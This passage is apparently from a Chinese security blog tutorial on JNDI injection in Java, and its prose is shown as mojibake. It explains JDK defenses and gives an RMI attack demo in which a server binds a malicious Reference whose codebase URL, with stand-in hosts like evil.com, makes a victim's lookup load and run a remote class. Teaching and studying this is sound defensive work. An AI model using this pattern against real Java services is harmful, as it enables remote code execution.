class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Properties env = <span class="hljs-keyword">new</span> Properties();<br>env.put(Context.INITIAL_CONTEXT_FACTORY,<br>        <span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);<br>env.put(Context.PROVIDER_URL,<br>        <span class="hljs-string">&quot;rmi://localhost:1099&quot;</span>);<br>Context ctx = <span class="hljs-keyword">new</span> InitialContext(env);<br></code></pre></div></td></tr></table></figure><p>è€Œåœ¨è°ƒç”¨ <code>lookup()</code> æˆ–è€… <code>search()</code> æ—¶ï¼Œå¯ä»¥ä½¿ç”¨å¸¦ URI åŠ¨æ€çš„è½¬æ¢ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œä¾‹å¦‚ä¸Šé¢å·²ç»è®¾ç½®äº†å½“å‰ä¸Šä¸‹æ–‡ä¼šè®¿é—® RMI æœåŠ¡ï¼Œé‚£ä¹ˆå¯ä»¥ç›´æ¥ä½¿ç”¨ LDAP çš„ URI æ ¼å¼å»è½¬æ¢ä¸Šä¸‹æ–‡ç¯å¢ƒè®¿é—® LDAP æœåŠ¡ä¸Šçš„ç»‘å®šå¯¹è±¡ï¼š</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">ctx.lookup(<span class="hljs-string">&quot;ldap://ip:2333/&quot;</span>);<br></code></pre></div></td></tr></table></figure><p>å…·ä½“å¯ä»¥çœ‹æºç å®ç°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">lookup</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> NamingException </span>&#123;<br>    <span class="hljs-keyword">return</span> getURLOrDefaultInitCtx(name).lookup(name);<br>&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> Context <span class="hljs-title">getURLOrDefaultInitCtx</span><span class="hljs-params">(Name paramName)</span> <span class="hljs-keyword">throws</span> NamingException </span>&#123;<br>    <span class="hljs-keyword">if</span> (NamingManager.hasInitialContextFactoryBuilder()) &#123;<br>        <span class="hljs-keyword">return</span> getDefaultInitCtx(); <br>    &#125;<br>    <span class="hljs-keyword">if</span> (paramName.size() &gt; <span class="hljs-number">0</span>) &#123;<br>        String str1 = paramName.get(<span class="hljs-number">0</span>);<br>        String str2 = getURLScheme(str1);  <span class="hljs-comment">// å°è¯•è§£æ URI ä¸­çš„åè®®</span><br>        <span class="hljs-keyword">if</span> (str2 != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-comment">// å¦‚æœå­˜åœ¨ Schema åè®®ï¼Œåˆ™å°è¯•è·å–å…¶å¯¹åº”çš„ä¸Šä¸‹æ–‡ç¯å¢ƒ</span><br>            Context localContext = NamingManager.getURLContext(str2, <span class="hljs-keyword">this</span>.myProps);<br>            <span class="hljs-keyword">if</span> (localContext != <span class="hljs-keyword">null</span>) &#123; <br>                <span class="hljs-keyword">return</span> localContext;<br>            &#125;<br>        &#125;  <br>    &#125;<br>    <span class="hljs-keyword">return</span> getDefaultInitCtx();<br>&#125;<br></code></pre></div></td></tr></table></figure><p>åœ¨<code>getURLOrDefaultInitCtx</code>ä¸­ä¼šåˆ¤æ–­æ˜¯å¦å­˜åœ¨ç‰¹å®šçš„åè®®ï¼Œå¦‚æœæœ‰ä»£ç åˆ™ä¼šä½¿ç”¨ç›¸åº”çš„å·¥å‚å»åˆå§‹åŒ–ä¸Šä¸‹æ–‡ç¯å¢ƒï¼Œè¿™æ—¶å€™ä¸ç®¡ä¹‹å‰é…ç½®çš„å·¥å‚ç¯å¢ƒæ˜¯ä»€ä¹ˆï¼Œè¿™é‡Œéƒ½ä¼šè¢«åŠ¨æ€åœ°å¯¹å…¶è¿›è¡Œæ›¿æ¢ã€‚</p><p>å®Œæ•´æµ‹è¯•ä»£ç </p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> JDNI.com.RMI;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RMI_REMOTE_REGISTER_TEST</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException, RemoteException, AlreadyBoundException </span>&#123;<br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="hljs-keyword">true</span>));<br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<br>        <span class="hljs-comment">//åˆå§‹åŒ–jndiæœåŠ¡è®¾ç½®</span><br>        Properties env = <span class="hljs-keyword">new</span> Properties();<br>        <span class="hljs-comment">//åˆå§‹åŒ–ä¸Šä¸‹æ–‡å·¥å‚åï¼Œä¸åŒçš„ç›®å½•æœåŠ¡æœ‰ä¸åŒçš„åå­—ã€‚ä¾‹å¦‚DNSçš„æ˜¯â€œcom.sun.jndi.dns.DnsContextFactoryâ€</span><br>        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);<br>        <span class="hljs-comment">//è®¾ç½®JNDIæä¾›æœåŠ¡çš„URLåœ°å€</span><br>        env.put(Context.PROVIDER_URL,<span class="hljs-string">&quot;rmi://localhost:1099&quot;</span>);<br>        env.put(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>,<span class="hljs-keyword">true</span>);<br><br>        Context ctx = <span class="hljs-keyword">new</span> InitialContext(env);<br><br>        <span class="hljs-comment">//rmiæ³¨å†Œ</span><br>        Registry registry = LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        Hello h1 = <span class="hljs-keyword">new</span> HelloImpl();<br>        registry.bind(<span class="hljs-string">&quot;hello&quot;</span>,h1);<br><br>        <span class="hljs-comment">//åŠ¨æ€åŠ è½½ç±»</span><br>        Reference remote_load  = <span class="hljs-keyword">new</span> Reference(<span class="hljs-string">&quot;remote_load&quot;</span>,<span class="hljs-string">&quot;remote_load_test&quot;</span>,<span class="hljs-string">&quot;http://39.10.239.30/JNDI/&quot;</span>);<br>        ReferenceWrapper remote_loadWrapper = <span class="hljs-keyword">new</span> ReferenceWrapper(remote_load);<br>        registry.bind(<span class="hljs-string">&quot;remoteLoad&quot;</span>,remote_loadWrapper);<br><br>        <span class="hljs-comment">//è¿œç¨‹æœåŠ¡ç«¯è°ƒç”¨æ–¹æ³•</span><br>        Hello reh1 = (Hello) ctx.lookup(<span class="hljs-string">&quot;hello&quot;</span>);<br>        reh1.sayHello(<span class="hljs-string">&quot;KKfine&quot;</span>);<br><br>        <span class="hljs-comment">//è¿œç¨‹è°ƒç”¨æœ¬åœ°ä¸å­˜åœ¨çš„class</span><br>        Object test = ctx.lookup(<span class="hljs-string">&quot;remoteLoad&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/50ed7cf19e7a45339b3a7618da9668f6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h1 id="JNDI-Referencesæ³¨å…¥"><a href="#JNDI-Referencesæ³¨å…¥" class="headerlink" title="JNDI Referencesæ³¨å…¥"></a>JNDI Referencesæ³¨å…¥</h1><p>æ—¢ç„¶ä¸Šé¢è¯´åˆ°å¯ä»¥åŠ è½½å¤–éƒ¨ç±»ï¼Œé‚£ä¹ˆè¿™é‡Œè‡ªç„¶å°±è”æƒ³åˆ°å¦‚æœåŠ è½½æˆ‘ä»¬çš„æ¶æ„ç±»ä¸å°±èƒ½å¤ŸRCEäº†ã€‚</p><h2 id="å‰ææ¡ä»¶-amp-JDKé˜²å¾¡"><a href="#å‰ææ¡ä»¶-amp-JDKé˜²å¾¡" class="headerlink" title="å‰ææ¡ä»¶&amp;JDKé˜²å¾¡"></a>å‰ææ¡ä»¶&amp;JDKé˜²å¾¡</h2><p>è¦æƒ³æˆåŠŸåˆ©ç”¨JNDIæ³¨å…¥æ¼æ´ï¼Œé‡è¦çš„å‰æå°±æ˜¯å½“å‰Javaç¯å¢ƒçš„JDKç‰ˆæœ¬ï¼Œè€ŒJNDIæ³¨å…¥ä¸­ä¸åŒçš„æ”»å‡»å‘é‡å’Œåˆ©ç”¨æ–¹å¼æ‰€è¢«é™åˆ¶çš„ç‰ˆæœ¬å·éƒ½æœ‰ç‚¹ä¸ä¸€æ ·ã€‚</p><p>è¿™é‡Œå°†æ‰€æœ‰ä¸åŒç‰ˆæœ¬JDKçš„é˜²å¾¡éƒ½åˆ—å‡ºæ¥ï¼š</p><ul><li>JDK 6u45ã€7u21ä¹‹åï¼š<code>java.rmi.server.useCodebaseOnly</code>çš„é»˜è®¤å€¼è¢«è®¾ç½®ä¸ºtrueã€‚å½“è¯¥å€¼ä¸ºtrueæ—¶ï¼Œå°†ç¦ç”¨è‡ªåŠ¨åŠ è½½è¿œç¨‹ç±»æ–‡ä»¶ï¼Œä»…ä»CLASSPATHå’Œå½“å‰JVMçš„<code>java.rmi.server.codebase</code>æŒ‡å®šè·¯å¾„åŠ è½½ç±»æ–‡ä»¶ã€‚ä½¿ç”¨è¿™ä¸ªå±æ€§æ¥é˜²æ­¢å®¢æˆ·ç«¯VMä»å…¶ä»–Codebaseåœ°å€ä¸ŠåŠ¨æ€åŠ è½½ç±»ï¼Œå¢åŠ äº†RMI ClassLoaderçš„å®‰å…¨æ€§ã€‚</li><li>JDK 6u141ã€7u131ã€8u121ä¹‹åï¼šå¢åŠ äº†<code>com.sun.jndi.rmi.object.trustURLCodebase</code>é€‰é¡¹ï¼Œé»˜è®¤ä¸ºfalseï¼Œç¦æ­¢RMIå’ŒCORBAåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼Œå› æ­¤RMIå’ŒCORBAåœ¨ä»¥ä¸Šçš„JDKç‰ˆæœ¬ä¸Šå·²ç»æ— æ³•è§¦å‘è¯¥æ¼æ´ï¼Œä½†ä¾ç„¶å¯ä»¥é€šè¿‡æŒ‡å®šURIä¸ºLDAPåè®®æ¥è¿›è¡ŒJNDIæ³¨å…¥æ”»å‡»ã€‚</li><li>JDK 6u211ã€7u201ã€8u191ä¹‹åï¼šå¢åŠ äº†<code>com.sun.jndi.ldap.object.trustURLCodebase</code>é€‰é¡¹ï¼Œé»˜è®¤ä¸ºfalseï¼Œç¦æ­¢LDAPåè®®ä½¿ç”¨è¿œç¨‹codebaseçš„é€‰é¡¹ï¼ŒæŠŠLDAPåè®®çš„æ”»å‡»é€”å¾„ä¹Ÿç»™ç¦äº†ã€‚</li></ul><p>å› æ­¤ï¼Œæˆ‘ä»¬åœ¨è¿›è¡ŒJNDIæ³¨å…¥ä¹‹å‰ï¼Œå¿…é¡»çŸ¥é“å½“å‰ç¯å¢ƒJDKç‰ˆæœ¬è¿™ä¸€å‰ææ¡ä»¶ï¼Œåªæœ‰JDKç‰ˆæœ¬åœ¨å¯åˆ©ç”¨çš„èŒƒå›´å†…æ‰æ»¡è¶³æˆ‘ä»¬è¿›è¡ŒJNDIæ³¨å…¥çš„å‰ææ¡ä»¶ã€‚</p><h2 id="RMIæ”»å‡»"><a href="#RMIæ”»å‡»" class="headerlink" title="RMIæ”»å‡»"></a>RMIæ”»å‡»</h2><p>åˆ©ç”¨RMIçš„æ”»å‡»ï¼Œé¦–å…ˆå°±æ˜¯å°†æ¶æ„ç±»ç»‘å®šåœ¨æ³¨å†Œè¡¨ä¸­ï¼Œæ¶æ„çš„è¿œç¨‹å¼•ç”¨æŒ‡å‘æˆ‘ä»¬çš„æ¶æ„ç±»ã€‚å°±æ˜¯åœ¨<code>lookup()</code>å¤–éƒ¨å‚æ•°å¯æ§æˆ–è€…<code>References</code>æ„é€ ä¸­çš„<code>classFactoryLocation</code>å‚æ•°å¤–éƒ¨å¯æ§æ—¶ï¼Œå°†è¿™ä¸ªå‚æ•°è®¾ç½®æˆæˆ‘ä»¬çš„è¿œç¨‹æ¶æ„ç±»ï¼Œä¼šä½¿ç”¨æˆ·çš„JNDIå®¢æˆ·ç«¯è®¿é—®æ³¨å†Œè¡¨ä¸­çš„æ¶æ„å¼•ç”¨ï¼Œä»è€ŒåŠ è½½è¿œç¨‹çš„æ¶æ„ç±»ï¼Œæœ€ç»ˆå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æµç¨‹å¦‚å›¾ï¼š</p><p><img src="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/6.png" alt="img"></p><p>1.é¦–å…ˆå°±æ˜¯å½“å‚æ•°å¯æ§æ—¶ï¼Œæˆ‘ä»¬åˆ©ç”¨åŠ¨æ€åŠ è½½ç±»çš„ç‰¹æ€§ä¼ å…¥ä¸€ä¸ªæˆ‘ä»¬æ¶æ„æœåŠ¡å™¨çš„åœ°å€æ¯”å¦‚è¿™é‡Œæ˜¯<code>rmi://evil.com:1099</code>ï¼Œä¼ å…¥ä¹‹ååŸå…ˆçš„<code>rmi://localhost:1099</code>ä¾¿å·²ç»è¢«æ›¿æ¢æ‰äº†</p><p>2.ç„¶åè¿™ä¸ªæ¶æ„æœåŠ¡ä¸­<code>Reference</code>ç»‘å®šçš„æ˜¯æˆ‘ä»¬çš„æ¶æ„å¯¹è±¡<code>Reference(&quot;EvilObject&quot;, &quot;EvilObject&quot;, &quot;http://evil-cb.com/&quot;)</code></p><p>3.æ¥ç€å½“å®¢æˆ·ç«¯æŸ¥è¯¢è¿™ä¸ªç±»æ—¶ï¼Œåœ¨æœ¬åœ°æ²¡æœ‰å‘ç°ï¼Œä¾¿ä¼šæŸ¥è¯¢æ³¨å†Œè¡¨ï¼Œä½†è¿™æ˜¯æˆ‘ä»¬çš„æ¶æ„æœåŠ¡å·²ç»åƒæ³¨å†Œè¡¨ä¸­æä¾›äº†å®ƒæ‰€éœ€è¦çš„ç±»ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„æ¶æ„ç±»ï¼Œç”±æ­¤ä¾¿ä¼šè¢«å®¢æˆ·ç«¯è¯·æ±‚è°ƒç”¨ï¼Œä»è€Œæ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤ã€‚</p><p>æ”»å‡»demo</p><p>å®¢æˆ·ç«¯</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> JDNI.com.RMIattack;<br><br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JNDIClient</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException </span>&#123;<br><br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, String.valueOf(<span class="hljs-keyword">true</span>));<br>        System.setProperty(<span class="hljs-string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="hljs-string">&quot;true&quot;</span>);<br>        <br>        String uri = <span class="hljs-string">&quot;rmi://127.0.0.1/evilObj&quot;</span>;<br>        Context ctxt = <span class="hljs-keyword">new</span> InitialContext();<br>        ctxt.lookup(uri);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>æœåŠ¡ç«¯</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> JDNI.com.RMIattack;<br><br><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RMIserver</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        Registry registry = LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br><br>        Reference evil = <span class="hljs-keyword">new</span> Reference(<span class="hljs-string">&quot;Evil&quot;</span>,<span class="hljs-string">&quot;Evil&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:8080/&quot;</span>);<br>        ReferenceWrapper r = <span class="hljs-keyword">new</span> ReferenceWrapper(evil);<br>        System.out.println(<span class="hljs-string">&quot;Binding is Evil to rmi://127.0.0.1:1099/evilObj&quot;</span>);<br>        registry.bind(<span class="hljs-string">&quot;evilObj&quot;</span>,r);<br><br><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/8b335711c579457aac7d1fc98bcd77b5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œä¼šæŠ¥é”™æ˜¯å› ä¸ºæœ€åå®ä¾‹åŒ–è¿œç¨‹ç±»(<code>EvilObj</code>)çš„æ—¶å€™è¿›è¡Œäº†ç±»å‹è½¬æ¢ä¸º<code>ObjectFactory</code>ç±»ï¼Œè€Œè¯¥ç±»å®é™…ä¸Šæ˜¯ä¸€ä¸ªæ¥å£ï¼Œæ‰€ä»¥å¦‚æœè¦è®©å®ƒä¸æŠ¥é”™å°±å®ç°æ¥å£é‡Œé¢çš„æ–¹æ³•å°±è¡Œäº†ï¼Œè€Œè¿™ä¸ªæ¥å£å°±åªæœ‰ä¸€ä¸ªæ–¹æ³•ã€‚</p><p><img src="https://img-blog.csdnimg.cn/7cfa5314fb65423f8d614bae87269992.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h3><p>å…¶å®æ¯æ¬¡åœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­æ€»èƒ½å­¦åˆ°å¾ˆå¤šé™Œç”Ÿçš„ä¸œè¥¿ï¼Œä½†æ˜¯è¿™äº›ä¸œè¥¿å¾ˆå°‘è®°å½•ä¸‹æ¥ï¼Œä»¥è‡³äºè°ƒè¯•å®Œå°±æ²¡æœ‰åç»­äº†ï¼Œè°ƒè¯•ä¸­é‡åˆ°äº†ä¸€ä¸ªå¾ˆå¸¸è§ä½†æ˜¯æ–¹æ³•å¾ˆå¤šçš„ä¸œè¥¿å°±æ˜¯javaå­—èŠ‚ç çš„åŠ è½½ï¼Œåœ¨è°ƒç”¨<code>getObjectFactoryFromReference</code>æ–¹æ³•è¦è¿”å›å®ä¾‹åŒ–çš„æ³¨å†Œç±»æ—¶ï¼Œè¿™é‡Œç”¨äº†<code>static final VersionHelper helper = VersionHelper.getVersionHelper();</code>çš„åŠ è½½æ–¹æ³•</p><p><img src="https://img-blog.csdnimg.cn/9f1deea18f684ef7b5120c43ff52e968.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç»è¿‡æœç´¢ä¹‹åå‘ç°åœ¨<code>JSP Webshell</code>ç»å¸¸å‡ºç°è¿™ä¸ªèº«å½±ï¼Œæ‰€ä»¥ä¸­é—´åˆç©¿æ’å­¦äº†ä¸‹<code>JSP Webshell</code>ï¼Œå±äºçœ‹å•¥å•¥ä¸ä¼šäº†ï¼Œ<code>JSP Webshell</code>åº”è¯¥ä¼šå†å†™ä¸€ç¯‡åšå®¢äº†ã€‚è¿™é‡Œç®€å•è®°å½•ä¸€ä¸‹ã€‚</p><h2 id="æ¼æ´ç‚¹åˆ†æ"><a href="#æ¼æ´ç‚¹åˆ†æ" class="headerlink" title="æ¼æ´ç‚¹åˆ†æ"></a>æ¼æ´ç‚¹åˆ†æ</h2><h4 id="lookupå‚æ•°æ³¨å…¥"><a href="#lookupå‚æ•°æ³¨å…¥" class="headerlink" title="lookupå‚æ•°æ³¨å…¥"></a><code>lookup</code>å‚æ•°æ³¨å…¥</h4><p>è¿™ç§æ¼æ´å°±æ˜¯ä¸Šé¢æ‰€æ¼”ç¤ºçš„ï¼Œ<code>ctx.lookup()</code>ä¸­å‚æ•°å¯æ§ï¼Œç„¶ååŠ¨æ€åŠ è½½æˆ‘ä»¬çš„æ¶æ„ç±»</p><h4 id="classFactoryLocationå‚æ•°æ³¨å…¥"><a href="#classFactoryLocationå‚æ•°æ³¨å…¥" class="headerlink" title="classFactoryLocationå‚æ•°æ³¨å…¥"></a><code>classFactoryLocation</code>å‚æ•°æ³¨å…¥</h4><p>å‰é¢lookup()å‚æ•°æ³¨å…¥æ˜¯åŸºäºRMIå®¢æˆ·ç«¯çš„ï¼Œä¹Ÿæ˜¯æœ€å¸¸è§çš„ã€‚è€Œ<code>classFactoryLocation</code>å‚æ•°æ³¨å…¥åˆ™æ˜¯å¯¹äºRMIæœåŠ¡ç«¯è€Œè¨€çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æœåŠ¡ç«¯ç¨‹åºåœ¨è°ƒç”¨Reference()åˆå§‹åŒ–å‚æ•°æ—¶ï¼Œå…¶ä¸­çš„<code>classFactoryLocation</code>å‚æ•°å¤–éƒ¨å¯æ§ï¼Œå¯¼è‡´å­˜åœ¨JNDIæ³¨å…¥ã€‚å¦‚å›¾</p><p><img src="https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/10.png" alt="img"></p><p>å°†ä¸Šè¿°çš„JNDIå®¢æˆ·ç«¯ç¨ä½œä¿®æ”¹å³å¯ï¼Œå¯ä»¥çœ‹åˆ°lookupå‚æ•°å·²ç»å›ºå®šè€ŒæœåŠ¡ç«¯å‚æ•°å¯æ§ã€‚ä½†æ˜¯è¿™é‡Œæ³¨æ„å› ä¸ºlookupç›´æ¥æŸ¥è¯¢è¿œç¨‹å¼•ç”¨å¯¹è±¡ï¼Œæ‰€ä»¥éœ€è¦åˆå§‹åŒ–ä¸Šä¸‹æ–‡å‘Šè¯‰å®¢æˆ·ç«¯ä½¿ç”¨ä»€ä¹ˆç›®å½•æœåŠ¡ï¼Œå¹¶ä¸”æä¾›æœåŠ¡<code>url</code>åœ°å€ã€‚</p><p> <img src="https://img-blog.csdnimg.cn/3233c91e345d4d6387c13d108f568eaf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/2f508d2b36cd459bae4ccb87fe1f6b78.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h4 id="RMIæ¶æ„è¿œç¨‹å¯¹è±¡"><a href="#RMIæ¶æ„è¿œç¨‹å¯¹è±¡" class="headerlink" title="RMIæ¶æ„è¿œç¨‹å¯¹è±¡"></a>RMIæ¶æ„è¿œç¨‹å¯¹è±¡</h4><blockquote><p>æ”»å‡»è€…å®ç°ä¸€ä¸ªRMIæ¶æ„è¿œç¨‹å¯¹è±¡å¹¶ç»‘å®šåˆ°RMI Registryä¸Šï¼Œç¼–è¯‘åçš„RMIè¿œç¨‹å¯¹è±¡ç±»å¯ä»¥æ”¾åœ¨HTTP/FTP/SMBç­‰æœåŠ¡å™¨ä¸Šï¼Œè¿™ä¸ªCodebaseåœ°å€ç”±è¿œç¨‹æœåŠ¡å™¨çš„ java.rmi.server.codebase å±æ€§è®¾ç½®ï¼Œä¾›å—å®³è€…çš„RMIå®¢æˆ·ç«¯è¿œç¨‹åŠ è½½ï¼ŒRMIå®¢æˆ·ç«¯åœ¨ lookup() çš„è¿‡ç¨‹ä¸­ï¼Œä¼šå…ˆå°è¯•åœ¨æœ¬åœ°CLASSPATHä¸­å»è·å–å¯¹åº”çš„Stubç±»çš„å®šä¹‰ï¼Œå¹¶ä»æœ¬åœ°åŠ è½½ï¼Œç„¶è€Œå¦‚æœåœ¨æœ¬åœ°æ— æ³•æ‰¾åˆ°ï¼ŒRMIå®¢æˆ·ç«¯åˆ™ä¼šå‘è¿œç¨‹Codebaseå»è·å–æ”»å‡»è€…æŒ‡å®šçš„æ¶æ„å¯¹è±¡ï¼Œè¿™ç§æ–¹å¼å°†ä¼šå—åˆ° useCodebaseOnly 